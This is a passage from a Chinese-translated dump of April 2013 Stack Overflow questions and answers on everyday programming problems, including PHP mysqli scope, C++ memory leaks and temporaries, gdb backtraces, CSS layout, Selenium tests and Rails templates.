server:~ ioscoder$ java -v
No Java runtime present, requesting install. 
```

它问我是否要安装java。接受这一点并执行 java 安装后，我很高兴在 Safari 中看到 localhost:8080 的“仪表板 [Jenkins]”页面。

# javascript - 将输入值与单个值进行比较

> ID：15936867
> 
> 赞同：0
> 
> 时间：2013-04-10T21:36:03.757
> 
> 标签：javascript, jquery

我正在尝试找出一种方法来验证来自单击按钮的 ID，该 ID 在一组输入中尚不存在。

从单击的按钮获取 ID 的代码

```
 $(".detail-view button").on("click", function() {
       var detailID = $(this).attr('id'); 
```

检查 ID 的代码不存在

```
function itemExists() {
    $("input#lunchorder_item_entry_id").each(function() {
        existingID = $(this).val();

        if(detailID == existingID) {
           alert("You have already added this item. If you want to change item details, please remove the item and re-add it to your cart. Thank You!");
        } else {

       }
    });
} 
```

我遇到的问题仅在部分时间有效，如果有人对更好的方法提出建议，我相信这不是实现我目标的最佳方法。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:42:43.967

`detailID`在您的函数中不可见`itemExists()`，要么将其设为全局，要么将其传递给函数。

```
itemExists(detailID){
  // if(detailID == existingID) {
} 
```

整个这应该看起来像这样

```
 $(".detail-view button").on("click", function() {
       var detailID = $(this).attr('id');
       itemExists(detailID);
 });
 function itemExists(detailID) {
    $("input#lunchorder_item_entry_id").each(function() {
            var existingID = $(this).val();
            if(detailID == existingID) {
               alert("You have already added this item. If you want to change item details, please remove the item and re-add it to your cart. Thank You!");
            } else {

            }
     });
 } 
```

# php - mysqli_query 错误

> ID：15936869
> 
> 赞同：-1
> 
> 时间：2013-04-10T21:36:07.973
> 
> 标签：php, mysqli

我定义我`$link`的`database.php`：

```
$link=mysqli_connect("localhost","root","","oop");

if (mysqli_connect_errno($link))
{
    echo "Failed to connect to MySQL: " . mysqli_connect_error();
} 
```

之后，我将其包含在我的`header.php`：

```
include "../includes/database.php"; 
```

然后我在`mysqli_query`通话中使用它：

```
$result = mysqli_query($link, "SELECT * FROM Menu") 
          or die(mysql_error());
while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) {
    echo '<div id= menulist>';
    echo '<div class="menu" id="menu-'.$row['menu_id'].'">';
    echo $row['menu_name'] . " - ". $row['menu_weight']
         . "<a class='delete' href='?delete=".$row['menu_id']
         ."'><img src='images/delete.png' /></a>";
    echo '</div>'; 
```

出现以下错误：

> 警告：mysqli_query() 期望参数 1 为 mysqli，在第 39 行的 /Applications/XAMPP/xamppfiles/htdocs/www/oop/admin/menu_class.php 中给出 null

我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:39:50.890

你的问题与mysqli无关。这是[可变范围](http://www.php.net/manual/en/language.variables.scope.php)问题。使用`global`关键字使 $link 可用。这显然是许多人重复的问题

# c++ - 队列中的内存泄漏

> ID：15936873
> 
> 赞同：0
> 
> 时间：2013-04-10T21:36:22.673
> 
> 标签：c++, memory-leaks, queue

我的 Queue 类出现内存泄漏。我使用 valgrind 来定位内存泄漏，并且两次都发生在同一行。该行已在代码中标记。

```
template <typename T>
void Queue<T>::enqueue(const T& x)
{

    if(isEmpty())
    {
        Queue<T>* temp = new Queue<T>();//THIS IS THE LEAKED MEMORY
        m_data = x;
        m_next = temp;
        temp->m_next = NULL;
        return;

    }

    Queue<T>* temp = this;

    while(temp->m_next != NULL)
    {
        temp = temp->m_next;
    }
    Queue<T>* node = new Queue<T>();
    temp->m_data = x;
    node->m_next = temp->m_next;
    temp->m_next = node;
    return;
} 
```

功能`isEmpty()`如下：

```
template <typename T>
bool Queue<T>::isEmpty() const
{
    return (m_next==NULL);
} 
```

任何关于此的想法都会很棒。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:43:18.290

```
Queue<T>* temp = new Queue<T>();//THIS IS THE LEAKED MEMORY 
```

这是因为你必须在某处释放内存，通过

`delete temp;`

也许你不这样做。不在您展示的这段代码中。所以在适当的时候简单地删除它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-11T04:17:45.003

我能够修复错误。它在代码的其他地方。实际上，我在发布此问题后几乎立即找到了它。谢谢您的帮助。

# objective-c - 图片在按钮中显示为空白

> ID：15936874
> 
> 赞同：1
> 
> 时间：2013-04-10T21:36:31.770
> 
> 标签：objective-c, uibutton, icons, uitoolbar

我从一个免费的图标数据库下载了一个大拇指图标，它的大小对于按钮来说太大了，而且它有白色背景。我决定在 pixelmator 中打开它，调整了图标的大小并删除了背景。当用预览打开它时，它看起来很棒，但是当它设置为 xcode 中的按钮图像时，它显示为一个白色圆圈。

这是编辑后的图标（30x30 png） ![在此处输入图像描述](https://i.stack.imgur.com/JLz7g.png) ，这是它在按钮上的外观![在此处输入图像描述](https://i.stack.imgur.com/fsZBH.png)

我应该怎么做才能解决这个问题？

**编辑/更新：** 我尝试了@yunas 代码，它在导航栏中有效，**不适用于工具栏**（甚至没有显示按钮）。

尝试此代码：

```
UIImage* image = [UIImage imageNamed:@"imageName"];
UIBarButtonItem *likeBtn = [[UIBarButtonItem alloc] initWithImage:image style:UIBarButtonItemStylePlain target:self action:@selector(action_clicked:)];
NSArray* toolbarItems = [NSArray arrayWithObjects:likeBtn,nil];
self.toolbarItems = toolbarItems;
self.navigationController.toolbarHidden = NO; 
```

再次导致一个带有白色绘图的按钮

所以我想知道：工具栏中是否有可能有彩色按钮？也许我正在尝试不可能的事情......

**编辑/更新 II - 解决方案：**将 UIButton 包装在 UIBarButtonItem 内

```
@interface StatusUIBarButtonItem : UIBarButtonItem
- (id) initWithStatus: (enum StatusEnum)p_statusEnum;
@end

@implementation StatusUIBarButtonItem
- (instancetype)initWithStatus:(enum StatusEnum)p_statusEnum
{
    UIButton *button = [UIButton buttonWithType:UIButtonTypeCustom];
    [button setImage:[self getStatusImage] forState:UIControlStateNormal];
    [button addTarget:self action:@selector(status_Clicked:) forControlEvents:UIControlEventTouchUpInside];
    [button setFrame:CGRectMake(0, 0, 20, 20)];

    self = [super initWithCustomView:button];
    if (self) 
    {
        self.statusButton = button;
    }
    return self;
}

@end 
```

然后在 ViewController 类中：

```
-(void) viewDidLoad
{  
    StatusUIBarButtonItem* stausBtn = [[StatusUIBarButtonItem alloc]  initWithStatus:self.status];
    NSArray* toolbarItems = [NSArray arrayWithObjects: stausBtn, nil];
    self.toolbarItems = toolbarItems;
    self.navigationController.toolbarHidden = NO;
} 
```

我希望这会帮助像我一样想要工具栏中的彩色图像的其他人

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:44:08.020

```
 UIImage *buttonImage = [UIImage imageNamed:@"imageName.png"];
    UIButton *button = [UIButton buttonWithType:UIButtonTypeCustom];
    [button setImage:buttonImage forState:UIControlStateNormal];
    button.adjustsImageWhenDisabled = NO;
    button.frame = CGRectMake(0, 0, buttonImage.size.width, buttonImage.size.height);
    [button addTarget:self action:@selector(action:) forControlEvents:UIControlEventTouchUpInside];

   UIBarButtonItem *customBarItem = [[UIBarButtonItem alloc] initWithCustomView:button];
   self.navigationItem.rightBarButtonItem = customBarItem; 
```

# c# - ASP.NET MVC4 - Session_End - 如何在 Global.asax 的 Session_End 中获取当前登录的用户名？

> ID：15936875
> 
> 赞同：3
> 
> 时间：2013-04-10T21:36:32.327
> 
> 标签：c#, asp.net-mvc, session-state, global-asax, httpcontext

我的问题是，一旦 Session_End 在我的 Global.asax 中执行，该`HttpContext.Current`对象就不再存在 - 可能正如预期的那样，我想。所以，我想要做的是一旦会话结束，为当前登录的用户更新我的登录表并将他们的登录状态设置为假。这是我的 Session_End：

```
protected void Session_End(object sender, EventArgs e)
{
    Helpers.OperationContext.UpdateIndividualLogin();
} 
```

你可能猜到了，我可以尝试传入：

```
System.Web.HttpContext.Current.User.Identity.Name 
```

但是这个对象不再存在，因为我只能想象它已经被处理掉了。那么，有什么方法可以获取当前（或以前当前）用户的名称？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T21:53:04.153

您可以通过将所需信息（在本例中为用户名）存储在 Session 中来做到这一点。您可以在用户通过身份验证时存储它。

# django - 在 django 的小部件中为 js 媒体字段添加属性

> ID：15936879
> 
> 赞同：5
> 
> 时间：2013-04-10T21:36:40.500
> 
> 标签：django, attributes, requirejs, django-widget

我在我的大部分 javascript 中使用 AMD 加载和 requirejs，但在 django 的小部件中使用它们时遇到问题。

Django 的文档指出媒体应该以下列方式嵌入：

```
class Media:
    js = ('animations.js') 
```

这将创建以下 html：

```
<script type="text/javascript" src="http://static.example.com/animations.js"></script> 
```

但是如果我想拥有这个怎么办？

```
<script data-main="scripts/animations" src="scripts/require.js"></script> 
```

如何告诉 django 插入*data-main*属性？

谢谢您的回答。

# c - 解释 gdb 回溯

> ID：15936880
> 
> 赞同：1
> 
> 时间：2013-04-10T21:36:42.150
> 
> 标签：c, linux, gdb

我曾经`gdb`附加到一个进程。我试图弄清楚为什么它会陷入无限循环，以及它在做什么。我发出命令`backtrace`并`gdb`得到以下结果：

```
#0  0x000000000041cf30 in _talloc_free@plt ()
#1  0x0000000000452320 in winbindd_reinit_after_fork ()
#2  0x00000000004524e6 in fork_domain_child ()
#3  0x0000000000453585 in wb_child_request_trigger ()
#4  0x000000381d2048e2 in tevent_common_loop_immediate () from /lib64/libtevent.so.0
#5  0x00007fbed6b98e17 in run_events_poll () from /lib64/libsmbconf.so.0
#6  0x00007fbed6b9922e in s3_event_loop_once () from /lib64/libsmbconf.so.0
#7  0x000000381d204060 in _tevent_loop_once () from /lib64/libtevent.so.0
#8  0x000000000042049a in main () 
```

我的问题是：第一行中的 @ 符号是什么意思？我知道这`_talloc_free`是一个函数，但这是什么`@plt`意思？另外，为了确定：第二列中的数字是内存中函数的地址吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T23:12:13.053

PLT 是*过程链接表*。请参阅[此处的文档](http://refspecs.linuxfoundation.org/ELF/zSeries/lzsabi0_zSeries/x2251.html)。这用于延迟加载函数引用。

是不是*一直*卡在这里？这里纯粹是猜想，但如果是这样，那可能表明该函数仍未解决。例如，如果未加载预期的库。

是的，十六进制数字通常表示压入堆栈的指令指针的值。您可以使用命令验证这一点`l * <address>`，告诉 GDB 列出该地址处的代码行。或者只是使用`f <frame#>`命令切换到该堆栈帧。

尝试查看`/proc/<pid>/maps`（此过程的 PID 在哪里`<pid>`）并查看您期望的库是否`talloc_free`已加载。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T23:06:56.400

我很确定“@plt”是名称修饰的一部分。是的，第二列是您的地址。所以你现在可以输入“完成”，如果 gdb 没有让你在短时间内回到提示符，那么这意味着你的无限循环发生在talloc 的 free 中。这可能是talloc 库中的一个错误（我从未使用过），或者更有可能是您损坏了堆。您经常会发现使用 glibc 时，它会检测堆损坏并给您一个漂亮的崩溃消息。

我建议你在 valgrind 中运行你的程序——这是一种快速检测内存错误的好方法。

# domain-driven-design - 这对一个班级来说责任太多了吗？

> ID：15936891
> 
> 赞同：1
> 
> 时间：2013-04-10T21:37:34.277
> 
> 标签：domain-driven-design, cqrs

我有一个命令：MovePlayerCommand。

此命令的验证器之一做了 3 件事：

*   计算玩家移动的成本（可以调用以进行验证，也可以用于显示目的）

*   验证这个成本

*   收听“PlayerMoved”事件，以便我们可以应用成本（例如 - 10 个行动点）。

这对一个班级来说责任太多了吗？如果是这样，您将如何区分它？

编辑：我知道删除成本并检查它是两件事，但我无法将它们与成本的计算分开，而且我不想为每个 Action 设置 3 个类

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T22:00:31.270

没有更多信息，无法明确回答。

也就是说，您所描述的听起来不像是验证器；这听起来像是某种“计算器”。

计算方法很可能属于一个类（计算器类），然后验证器类将引用计算器。

我倾向于在一个非常薄的处理程序类中处理域事件，然后该处理程序类遵循聚合根或服务（这是一种常见但不普遍的做法）。因此，根或服务可能还会引用计算器（可能还有验证器）。

这个问题对于 SO 来说可能过于宽泛，在 DDD 论坛上可能会得到更好的回答。即使这样，您也可能需要提供更多背景信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-16T13:39:31.287

这里有一个很大的误解，因为一些发表评论的人似乎混合了 DDD 和 CQRS。OP 正在谈论命令并用 cqrs 标记了这个问题，所以我假设 OP 确实在使用带有 CQRS 的 DDD。

域验证逻辑应该在命令处理程序中，您可以并且确实应该在命令命中处理程序存根之前进行数据检查，但不进行任何域逻辑验证。也就是说，除了在命令处理程序中之外，没有其他地方可以根据域逻辑验证命令，因为那是加载聚合的地方。

您显示的验证是域验证，因此它们实际上应该由您的聚合执行，所以是的，我认为您应该稍微打破这个责任，并拆分不同类型的验证：数据和域。

# c++ - 有没有办法安全地指向函数内部声明的临时值？

> ID：15936898
> 
> 赞同：3
> 
> 时间：2013-04-10T21:38:00.947
> 
> 标签：c++, pointers

考虑以下代码：

```
int * p;

void Set()
{
    int i = 7;
    p = & i; // potentially disastrous
} 
```

我知道指向一个可能被覆盖的值是不好的，但我记得读过有一种方法可以防止像 i 这样的值在声明时丢失，然后以这种方式指向。我已经翻遍了我的教科书，但很难找到详细说明这一点的确切文本，我开始认为我什至可能已经想象到了。有没有办法安全地指向函数内部声明的临时值？一种使临时值不再是临时的方法？

提前感谢您的所有帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T21:42:21.807

> 我记得读过有一种方法可以防止像 i 这样的值在声明时丢失，然后以这种方式指向

最接近您提到的内容（如果我正确理解了您的句子）是允许在绑定到*引用时延长**临时*对象生命周期的规则（C++11 标准的第 12.2/5 节）：

 *```
struct X { int x = 0; };
X foo() { return X(); }
int main()
{
    X const& x = foo(); // The lifetime of the object bound to x is prolonged
    x.x = 42; // This is OK
} 
```

但是，**指针和非临时对象都没有这样的规则**。

> 一种使临时值不再是临时的方法？

在您的示例中，`i`它**不是**临时的：它是一个具有*自动存储持续时间*的对象。临时对象是一个对象，其生命周期（通常）在创建它的完整表达式结束时终止（除了上面提到的例外以及 § 12.2/4-5 中列出的一些例外）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:55:42.193

将 const ref 设为临时会将此临时对象的生命周期延长到此 const 引用范围的末尾，但是在您的示例中，您没有获取临时对象而是本地自动对象的地址`i`。

所以要延长临时的寿命，只需：

```
const int& iref=int(3);
    int a= iref;
    //..do stuff with iref, i.e:
    printf("iref: %d\n", a); 
```

输出：

> 参考：3
> 
> 运行成功（总时间：46ms）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-10T21:48:56.207

的值`i`必须驻留在内存中的某个地方。如果在函数内部声明，很可能是在栈上分配的，函数返回时会丢失。如果您确实需要该值始终像示例中那样保持不变，那么您需要在函数外部将其声明为静态常量：

```
int * p;
static const int i = 7;

void Set()
{
    p = & i;
} 
```

如果这不是您所需要的，也许您可​​以详细说明您的最小示例代码，以便我们更好地理解您想要实现的目标。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-10T21:49:19.827

你可以使用`static`关键字。

```
#include <stdio.h>

int *p;

void set() {
    static int x = 7;
    p = &x;
}

int main(){
    set();
    printf("%d", *p);
} 
```

正确打印 7.

但是，除了对静态关键字和指针的研究之外，我强烈反对在任何情况下使用这样的代码。*

# linq-to-sql - 使用哑 DTO 的 F# 数据库类型提供程序

> ID：15936900
> 
> 赞同：3
> 
> 时间：2013-04-10T21:38:05.447
> 
> 标签：linq-to-sql, f#, type-providers

我试过搜索，除了 linq 之外找不到任何类型的数据库提供程序，它吐出连接的对象类型，其中嵌入了所有 linq 信息。

希望可能有一个用于 SQL 数据库的类型提供程序，它吐出一个愚蠢的 DTO，或者如果没有，一个库会自动转换它们或为我提供一些这样的库，这样我就可以获得我需要的所有生成类型的好处，而不必手动创建哑 DTO，我希望在我的存储库之外没有 linq to sql 引用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-31T01:52:45.283

[Fsharp.Data.SqlClient](http://fsprojects.github.io/FSharp.Data.SqlClient/)听起来像您正在寻找的东西。它生成元组或自定义记录类 DTO，并支持存储过程和表值 UDF。仅 SQL 2012。

# html - HTML/CSS 需要 div 占据父级垂直高度的 100%

> ID：15936902
> 
> 赞同：0
> 
> 时间：2013-04-10T21:38:20.750
> 
> 标签：html, css

我正在尝试创建一个以这个小提琴表示的网页......

[http://jsfiddle.net/jeljeljel/5BSva/](http://jsfiddle.net/jeljeljel/5BSva/)

我希望选项卡下左侧导航的垂直线绘制到页面底部的页脚顶部。

页脚功能需要保留。也就是说，如果页面内容不占据整个页面，页脚将保留在底部。如果页面内容超过视口的高度，页脚就会被向下推。

谁能解决这个问题？这肯定是具有挑战性的。

**HTML**

```
<div class="wrapper">
    <div class="header">
        HEADER
    </div>
    <div class="body">

        <ul class="nav nav-tabs" id="tabcontrol">
            <li class="active"><a href="#home" data-toggle="tab">Home</a></li>
        </ul>

        <div class="tab-content">
            <div class="tab-pane active" id="home" style="">
                <div class="navigation" style="">
                    navigation<br />
                    navigation<br />
                    navigation<br />
                </div>
                <div class="content">
                    content
                </div>
            </div>
        </div>

    </div>
    <div class="push">
    </div>
</div>
<div class="footer center">
    <div style="border-bottom: 2px solid rgb(174, 174, 201); background-color: #fff;"></div>
    <div>
        FOOTER
    </div>
</div> 
```

**CSS**

```
.body {
    border: 1px solid rgb(174, 174, 201);
    border-top: 5px solid rgb(174, 174, 201);
    border-bottom: 5px solid rgb(174, 174, 201);
    border-left: 2px solid rgb(174, 174, 201);
    border-right: 2px solid rgb(174, 174, 201);
    padding-bottom: 1000px;
    margin-bottom: -1000px;
}

/* Sticky Footer by Ryan Fait (http://ryanfait.com/) */
* {
    margin: 0;
}

html, body {
    height: 100%;
}

.wrapper {
    min-height: 100%;
    height: auto !important;
    height: 100%;
    margin: 0 auto -50px auto; /* the bottom margin is the negative value of the footer's height */
    overflow: hidden;
}

.footer {
    height: 50px;
    background-color: #f8f8f8;
}

.footer, .push {
    height: 50px; /* .push must be the same height as .footer */
    clear: both;
}

form {
    height: 100%;
}
/* Sticky Footer by Ryan Fait (http://ryanfait.com/) */

.navigation {
    float: left;
    width: 150px;
    border-right: 3px solid rgb(174, 174, 201);
    padding-top: 10px;
    white-space: nowrap;
}

.content {
    padding-top: 10px;
}

.nav {
    margin-bottom: 0px;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T22:10:23.983

OK完成。

您只需要将列定位为绝对，然后调整其余部分。
这是您必须添加的代码才能使其工作。

```
.navigation {

    position:absolute;
    bottom:50px;
    top:65px;
        }
.content {
    margin-left:160px;
} 
```

[这](http://jsfiddle.net/5BSva/1/)是你更新的小提琴（我做了一个红色的页脚让它更明显）
希望这有助于
欢呼

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T22:02:07.553

如果我明白你想要什么，你需要做一个假专栏！

[http://line25.com/articles/create-sidebars-of-equal-height-with-faux-columns](http://line25.com/articles/create-sidebars-of-equal-height-with-faux-columns)

:) 希望这有助于并回答您的问题

# linq-to-sql - Linq to SQL：从数据库和代码中删除列会导致无效列错误

> ID：15936906
> 
> 赞同：1
> 
> 时间：2013-04-10T21:38:30.180
> 
> 标签：linq-to-sql

我在 sharepoint 2010 服务应用程序中有一个非常简单的 linq to sql 实现，但遇到了一些障碍。

没有生成的类，我只是使用 System.Data.Linq.Mapping 语句、类中的 [Table(Name="")] 标记和带有 [Column(Name="")] 标记的列。在我创建的上下文对象中，它扩展了 DataContext 类，并且有一个 Table<> 对象。而已。

昨天我被要求从数据库中删除一列（实施相当晚），但这是一项简单的工作。我从数据库中删除了该列，从类中删除了对象，并检查了所有受影响的代码以删除对这个旧列的引用。

但是，每当使用该表的 linq to sql 对象时，我都会收到 Invalid Column Error。

我已经删除了表并重新创建了它，清理了我的 VS 解决方案，重建了它，从我们的 repo 中重新检查了它，从文件系统中删除了所有生成的对象，但还没有解决这个问题。

有谁知道如何解决它？

# git - 从上游拉取创建重复提交

> ID：15936909
> 
> 赞同：0
> 
> 时间：2013-04-10T21:38:36.427
> 
> 标签：git, github

我有两个回购。“上游”是基本版本，“起源”是经过修改的分叉。也就是说，对“upstream”的更改应该推送到“origin”，但对“origin”的更改不应该推送到“upstream”。

现在的问题是，从“起源”开始，当我这样做时`git pull upstream master`，我总是会遇到合并冲突。这些冲突总是与我已经修复的“上游”过去的 3 次提交相同。如果我这样做`git rebase`了，我必须再次解决这些合并冲突，所以我已经停止这样做了。如果我随后将这些更改推送到 github，我会看到每次推送时都会一遍又一遍地添加相同的 3 个提交，从而在提交历史记录中创建很多重复项，使其非常难看。

我该如何解决这个问题？我处理这个问题错了吗？有没有更好的办法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-17T01:38:26.173

我不再改变任何东西，我不再有任何问题。任何。

# c# - 当测试被赋予驱动程序类型作为测试用例时，如何实例化像 WebDriverWait 这样的变量？

> ID：15936911
> 
> 赞同：2
> 
> 时间：2013-04-10T21:38:39.217
> 
> 标签：c#, nunit, selenium-webdriver

我正在做 UI 测试。起初我只从 Firefox 浏览器驱动程序开始，所以我会在类下声明 WebDriverWait 变量，并在 [SetUp] 方法下分配它，如代码块所示，每个测试都可以使用它。

```
public class FirefoxTest {
public IWebDriver _driver;
public WebDriverWait _wait;
    [SetUp]
    public void SetupTest() {
          _driver = new FirefoxDriver();
          _wait = new WebDriverWait(_driver, TimeSpan.FromSeconds(30));
    } 
```

然后我尝试通过使用 [TestCaseSource(typeof(WebDriverFactory), "Drivers")] 属性指定更多 BrowserDrivers 来合并它们。所以现在 _driver 变量必须从 [SetUp] 中移出，而 _wait 变量不知道要使用什么 _driver。

我尝试在每个测试中实例化它，但这是重复的，并且这些测试使用的方法也需要 WebDriverWait 变量，并且当另一个测试尝试实现它们时，这些方法不会第二次运行，因为已经声明了 WebDriverWait 变量。

我的问题是我在哪里可以实例化 WebDriverWait 和其他依赖于驱动程序的东西，这些东西通常用 [SetUp] 和 [TearDown] 编写，例如当驱动程序作为 [TestCase] 给出时 driver.Quit()。

现在我的测试写得像

```
[TestCaseSource(typeof(WebDriverFactory), "Drivers")]
public void SomeTest(IWebDriver driver){
    driver.Navigate().GoTo....
} 
```

问题是我必须包括

```
WebDriverWait _wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30));
driver.Quit() 
```

在所有测试中以及在测试中重用的所有方法中的 _wait 。我在 [SetUp] 和 [Teardown] 中拥有的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-13T16:23:50.897

你在这里有两个选择。您没有提到`Drivers`on 属性`WebDriverFactory`是静态属性还是实例属性。如果它是一个静态属性，我会添加一个`QuitAll`可以在我的方法中调用的静态`TearDown`方法。如果它是一个实例方法，事情会变得更加棘手，我不确定你是否可以使用 NUnit 从这里到达那里。

另一方面，不是创建一个`WebDriverFactory`类来实例化驱动程序，而是另一种形式的`TestCaseSource`属性允许您指定测试所在类的属性或字段。它可能也适用于基础的属性或字段类，但你必须尝试一下才能确定。然后，您可以使用运行测试的同一类的成员，并且可以完全控制驱动程序对象的生命周期。看起来像这样：

```
// WARNING! Untested code written from memory
// without the aid of an IDE. Not guaranteed to
// work or even compile without modification.
// Use private field, public property
// (personal choice). 
private List<IWebDriver> activeDrivers = new List<IWebDriver>();
public List<IWebDriver> ActiveDrivers
{
    get { return this.activeDrivers; }
}

[TestFixtureSetUp]
public void InitializeDrivers()
{
    // Will run once for the class.
    // Use [SetUp] attribute to run
    // before each test method.
    this.activeDrivers.Add(new InternetExplorerDriver());
    this.activeDrivers.Add(new FirefoxDriver());
    this.activeDrivers.Add(new ChromeDriver());
}

[TestFixtureTearDown]
public void QuitAllDrivers()
{
    foreach(IWebDriver driver in this.activeDrivers)
    {
        driver.Quit();
    }
}

[TestCaseSource("ActiveDrivers")]
public void MyTest(IWebDriver driver)
{
    // Test goes here
} 
```

请注意，我没有提及您的`WebDriverWait`领域。这是因为该`WebDriverWait`对象非常轻巧，并且构建成本不高。如果您认为按需构造函数在您的代码中看起来丑陋或过于冗长，您可以将其分解为一个可以从测试中调用的单独方法，如下所示：

```
private void WaitUntil<T>(IWebDriver driver, Func<IWebDriver, T> until)
{
    WebDriverWait wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30));
    wait.Until<T>(until);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T22:45:32.390

您可以像这样实例化类型`[TestCase]`：

```
[TestCase(typeof(WebDriverWait))]
public class Test(Type driverType)
{
    _driver = Activator.CreateInstance(type, args);
} 
```

我不知道您所有的确切类型和参数，但 Activator.CreateInstance 可能对您有所帮助。

# javascript - 当用户按下回车键时，是否有另一种方法可以在移动 Safari（iOS 上）上触发自动更正/自动完成？

> ID：15936916
> 
> 赞同：8
> 
> 时间：2013-04-10T21:38:52.143
> 
> 标签：javascript, ios, mobile-safari, contenteditable, autocorrect

我知道当用户按下回车键时，浏览器通常会自行处理自动更正/大写等。但是我正在使用 contenteditable 属性并对“enter”进行一些特殊处理，这需要我在用户按下 enter 时使用 evt.preventDefault() 。由于我在侦听器中使用了 preventDefault() ，因此移动 safari 会打开自动更正气泡，并且看起来很时髦/无法使用。是否有任何替代方式（可能使用 JS 触发事件）来消除气泡或触发正常行为而无需取出 preventDefault？

我不想摆脱自动更正功能，因为它对我的应用程序很重要。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-13T11:39:30.960

我会说它很容易设置焦点，与之前提交的答案相比，自动行为将继续自动更正..

```
$("#MyInput").focus(function(event){
    event.preventDefault();
});
$("#MyInput").blur(){ // do events you want on focus lost.. from input.. :)
}); 
```

我想这会做..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-12T14:07:29.807

**应该有示例代码！**但我认为您谈论的是这样的事情：

```
$("#myForm").submit(function(event) {
    event.preventDefault();
    // Do other stuff
}); 
```

所以我很确定你可以[`.blur`](http://api.jquery.com/blur/)手动触发-event，它可以触发自动完成功能：

```
$("#myForm #myInput").blur(); 
```

如果这个答案是错误的，请提供示例代码——并不是 Stackoverflow 上的每个人都是魔术师。

# javascript - Twitter意图和oauth

> ID：15936921
> 
> 赞同：1
> 
> 时间：2013-04-10T21:39:01.940
> 
> 标签：javascript, twitter, oauth

我在谷歌上搜索并尝试了很多解决这个问题，但找不到解决方案。

我有一个带有 Javascript 的微型网站。我想对一个奖项进行“投票”，然后是“发推文->让发推文的用户->感谢投票用户名！”。

我尝试使用 twitter 意图，但是当我将 Intent Events 用于“tweet”时，参数“data”为空，因此我无法检索用户名。

然后，我尝试创建一个 twitter 应用程序，带有键和那个。我为此添加了 PHP，使用不同的库，但我唯一能实现的是允许发推文，但使用应用程序的相同帐户，而不是任何帐户，根据需要。

我做错了什么？我迷路了。

非常感谢！

# java - 这个方法在java中有什么问题？我想实现递归

> ID：15936923
> 
> 赞同：1
> 
> 时间：2013-04-10T21:39:10.430
> 
> 标签：java

我有以下方法，但我想使用递归；但是，我收到一个错误：“缺少返回语句”。

```
static String buscar(NodoDeArbol raiz, String letra) {
    if(raiz == null) {
        aux="";
        for (int i = 0; i < auxiliar.length()-1; i++) {
            aux+=auxiliar.charAt(i);
        }
        return aux;
    }
    auxiliar = buscar(raiz.izquierdo, auxiliar+= "0");
    auxiliar = buscar(raiz.derecho, auxiliar+= "1");
} 
```

应该怎么做才能解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:42:15.350

有几个错误

*   首先，您没有定义`aux`（也许是全球性的？）
*   其次，您需要在何时返回一个值`raiz != null`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:43:25.797

你是 if 语句有唯一的回报。您需要为 if 语句中未包含的案例添加一个 return 语句。仅从您当前的代码来看，我猜您打算`return auxiliar;`在方法结束时使用。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-10T21:40:54.130

您仅在 case 为 null 时返回一个字符串，但在 case 不为 null 时不返回任何内容。

您需要处理所有情况。返回方法（字符串）必须返回某种值。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-10T21:41:25.043

错误的是，只有当 raiz 为 null 时才返回，当你获得参数 raiz 时，它不为 null，方法永远不会结束 - 因为 if 语句之外没有返回

# ruby-on-rails - 带有 Ruby 后端的下划线模板不起作用

> ID：15936926
> 
> 赞同：0
> 
> 时间：2013-04-10T21:39:17.197
> 
> 标签：ruby-on-rails, ruby, underscore.js

我正在使用下划线模板来创建用于制作引导下拉菜单的模板。该代码在我自己的计算机上运行良好，但现在我将其添加到 ruby​​ on rails 后端服务器。现在代码不再有效。我被告知 <% %> 之间的代码被解释为 ruby​​ 代码而不是 javascript。我根本不知道 ruby​​，但是有人向我展示了如何编写 for 循环。

```
<!-- Dropdown Menu-->
<script type="text/template" id="dropdown">
  <div class="dropdown">
    <a class="dropdown-toggle" data-toggle="dropdown">
      <span> <%= name %> </span>
      <b class="caret"></b>
    </a>
    <ul class="dropdown-menu">
      <% array_of_items.each do |obj| %>
          <li> <a> <%= obj %> </a> </li>
      <% end %>
    </ul>
  </div>
</script> 
```

我得到的错误是“未定义的变量array_of_items”当然没有定义，我稍后定义

```
this.$el.append(this.makeDropdown({
    name: this.name,
    array_of_items: [1,2,3,4]
})); 
```

下划线模板对于 Javascript 的工作方式是这样的，但对于 Ruby，由于某种原因，它不允许我在模板中包含未定义的变量，我该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:44:56.060

所以我认为的问题就在这里：

```
<% array_of_items.each do |obj| %> 
```

Rails 将其解释为 ERB，并且由于没有在 Ruby 中声明变量，因此您会收到错误消息。尝试将您的 JS 代码添加到资产管道中？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:45:17.310

